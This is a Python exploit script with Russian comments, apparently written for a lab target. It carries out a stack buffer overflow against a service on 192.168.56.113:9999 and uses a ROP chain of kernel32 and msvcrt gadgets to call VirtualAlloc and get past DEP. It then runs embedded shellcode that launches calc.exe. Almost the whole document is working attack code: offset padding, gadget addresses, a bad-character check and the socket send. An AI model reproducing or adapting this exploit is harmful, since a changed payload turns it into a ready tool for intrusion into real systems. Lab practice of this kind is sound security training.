import struct

class OffsetPacker:
    def __init__(self, base):
        self.base = base
    
    def __call__(self, offset):
        return struct.pack('<I', self.base + offset)

# Создаю упаковщики для разных модулей
# Указываю Base Address
kernel32_p32 = OffsetPacker(base=0x754B0000)
msvcrt_p32 =   OffsetPacker(base=0x767B0000)
#ws2_32_p32 = OffsetPacker(base=0x776E0000)

# Обычная упаковка
def p32(x): return struct.pack('<I', x)

# Базовые константы
OFFSET = 524
ADDR_VA = kernel32_p32(0x137C0)       # offset для VirtualAlloc
ADDR_JMP_ESP = 0x311712F3             # Адрес jmp esp для выполнения кода в стеке
ROP_NOP = 0x3117124c                  # ret


# Шеллкод для запуска calc.exe (пример)
shellcode = b'\x90' * 16 + \
b'\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64' \
b'\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B' \
b'\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20' \
b'\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07' \
b'\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74' \
b'\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7'

#---------------------------------------------------------[Structure]-#
# LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc          #
#   _In_opt_  LPVOID lpAddress,       => Return Address (Call to ESP) #
#   _In_      SIZE_T dwSize,          => dwSize (0x1)                 #
#   _In_      DWORD flAllocationType, => flAllocationType (0x1000)    #
#   _In_      DWORD flProtect         => flProtect (0x40)             #
# );                                                                  #
#---------------------------------------------------[Register Layout]-#
# Функция берет аргрументы из 4 регистров                             #
# если аргументов больше, то далее - из стека                         #
#                                                                     #
# ECX 311712F3 => lpAddress (jmp esp)                                 #
# EDX 00000001 => dwSize                                              #
# ESI 00001000 => flAllocationType                                    #
# EDI 00000040 => flProtect                                           #
#---------------------------------------------------------------------#


# ECX rop - lpAddress
ecx = kernel32_p32(0x17130)         # xor eax, eax ; ret => 0x00000000
ecx += msvcrt_p32(0x73634)          # xchg eax, ecx ; ret => перенос eax в ecx => 0x00000000
#ecx = kernel32_p32(0x26083)        # pop ecx ; ret
#ecx += p32(ADDR_JMP_ESP)

# EDX rop - dwSize
edx = kernel32_p32(0x18FAF)        # pop eax ; ret
edx += p32(0xE58BFFFF)             # Bitwise Calc => E58BFFFF
edx += msvcrt_p32(0x270d3)         # xor eax, 0xe58bfffe ; pop ebp ; ret => EAX 0x00000001
edx += p32(0x43434343)             # EBP 43434343 => padding for pop ebp
edx += kernel32_p32(0x3a323)       # xchg eax, edx ; ret => перенос eax в edx

# ESI rop - flAllocationType
esi = kernel32_p32(0x18FAF)        # pop eax ; ret
esi += p32(0xE58BEFFE)             # Bitwise Calc => E58BEFFE
esi += msvcrt_p32(0x270d3)         # xor eax, 0xe58bfffe ; pop ebp ; ret => EAX 0x00001000
esi += p32(0x44444444)             # EBP 43434343 => padding for pop ebp
esi += msvcrt_p32(0x4b8f2)         # xchg eax, edi ; ret => перенос eax в edi
esi += msvcrt_p32(0x0bfb6)         # mov esi, edi ; ret => перенос edi в esi

# EDI rop - flProtect
edi = kernel32_p32(0x17130)        # xor eax, eax ; ret => 0x00000000
edi += msvcrt_p32(0x7f713)         # add eax, 0x60 ; ret
edi += msvcrt_p32(0x6c061)         # add eax, -0x20 ; pop ebp ; ret
edi += p32(0x42424242)             # padding for pop ebp
edi += msvcrt_p32(0x4b8f2)         # xchg eax, edi ; ret => перенос eax в edi => 0x00000040




# rop combine
rop = ecx + edx + esi + edi

# Адреса гаджетов
#pop_eax = kernel32_p32(0x00018FAF)  # -> p32(0x6B818FAF)      # pop eax; ret
#xor_eax = kernel32_p32(0x00017130)      # xor eax, eax; ret
#mov_ecx_eax = kernel32_p32(0x00019660)  # mov ecx, eax; mov eax, ecx; pop ebp; ret
#push_ecx = kernel32_p32(0x00027a37)     # push ecx; ret

payload = b'A' * OFFSET             # buf fill 520 + EBP затирание 4 байт в 32
#payload += p32(ADDR_JMP_ESP)        # jmp esp
payload += rop                      # Setting Registers For VirtualAlloc
payload += ADDR_VA                  # EIP → VirtualAlloc
payload += shellcode
#payload += b'XXXX'                  # Temp Stack Data 4 test only

# Проверки:
badchars = [b'\x00', b'\x0a', b'\x0d', b'\x09']
assert len(payload) <= 1000
assert not any(bad in payload for bad in badchars), \
       f'Payload contains one of badchars: {badchars!r}'

# Отправка
import socket
s = socket.create_connection(('192.168.56.113', 9999))
s.send(payload)
s.close()
